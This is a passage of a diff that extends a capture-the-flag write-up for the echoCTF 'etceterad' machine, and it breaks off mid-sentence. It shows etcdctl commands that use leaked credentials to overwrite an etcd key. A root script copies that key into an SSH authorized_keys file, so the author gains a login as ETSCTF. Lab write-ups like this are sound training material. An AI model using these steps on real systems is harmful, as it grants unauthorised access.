@@ -162,3 +162,63 @@ Fixing perms (0400)
 
 Viewing events from `pspy`.
 ![pspy output](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/inspecting_ps_for_fetch_keys.png)
+
+From the image above, we can see that the `/usr/local/sbin/fetch_keys` script queries a key from `etcd` and writes the value to `/home/ETSCTF/.ssh/authorized_keys`.
+
+Previously, we found out that we have write access to a number of keys under the `/home` prefix. We can enumerate and check the keys we can write to. If we can successfully write our own public keys to that to the `etcd` databasee, we can run the `/usr/local/sbin/fetch_keys` script to write our ssh public key to `/home/ETSCTF/.ssh/authorized_keys`. If this is successful then we would be able to login into the machine as `ETSCTF`.
+
+Checking the keys under the `/home` prefix.
+```
+mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/home/" --keys-only
+/home/ETSCTF/.ssh/authorized_keys
+```
+
+It is now evident that we have write access to that key.
+
+We have to first start off by generating our ssh public keys.
+```
+mcsam@0x32:~/$ ssh-keygen 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/mcsam/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/mcsam/.ssh/id_rsa
+Your public key has been saved in /home/mcsam/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:edHyAMJkJm5XAUbl/7lEzMMvHnaMrTtrD8Gr54vyoY8 mcsam@0x32
+The key's randomart image is:
++---[RSA 3072]----+
+|    .+Oo=.       |
+|   . =.+ . .     |
+|    o . . + .    |
+|   . .   o X     |
+|        S o X    |
+|         . o X   |
+|          . @ =  |
+|        .o B+B   |
+|        E+=+O*.  |
++----[SHA256]-----+
+```
+
+Now we will write the public keys to the `/home/ETSCTF/.ssh/authorized_keys` key.
+```
+mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/home/ETSCTF/.ssh/authorized_keys" < id_rsa.pub
+OK
+```
+
+After doing this we can run  the `/usr/local/sbin/fetch_keys` script and then login into the machine using our private key.
+```
+mcsam@0x32:~/$ ssh -i id_rsa ETSCTF@10.0.160.122
+Linux etceterad.echocity-f.com 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+ETSCTF@etceterad:~$ id
+uid=1000(ETSCTF) gid=1000(ETSCTF) groups=1000(ETSCTF)
+```
+
+We
